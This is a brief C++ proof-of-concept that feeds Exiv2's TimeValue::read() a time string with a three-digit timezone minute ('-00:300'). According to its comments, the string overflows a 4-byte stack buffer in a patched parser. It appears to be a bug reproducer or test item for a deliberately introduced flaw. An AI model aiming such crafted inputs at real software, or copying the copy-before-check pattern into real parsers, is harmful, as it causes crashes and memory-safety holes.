// PoC: TimeValue::read() stack-buffer-overflow via the timezone minute field.
//
// Reaches Exiv2::TimeValue::read(const std::string&) — a public API entry
// point — with an ISO-8601-looking time string whose basic-format timezone
// offset carries a 3-digit minute group ("-00:300"). The patched parser copies
// the raw minute digits into a fixed 4-byte stack buffer (sign + two digits +
// NUL) before range-checking the value, so the extra digit overruns the buffer.
//
// Parent tree: the minute group is parsed straight with std::stoi, rejected by
// the >59 range check, and read() simply returns 1 (no memory access fault).
#include <exiv2/value.hpp>

int main() {
  Exiv2::TimeValue value;
  std::string hms("23:55:02-00:300");
  value.read(hms);
  return 0;
}
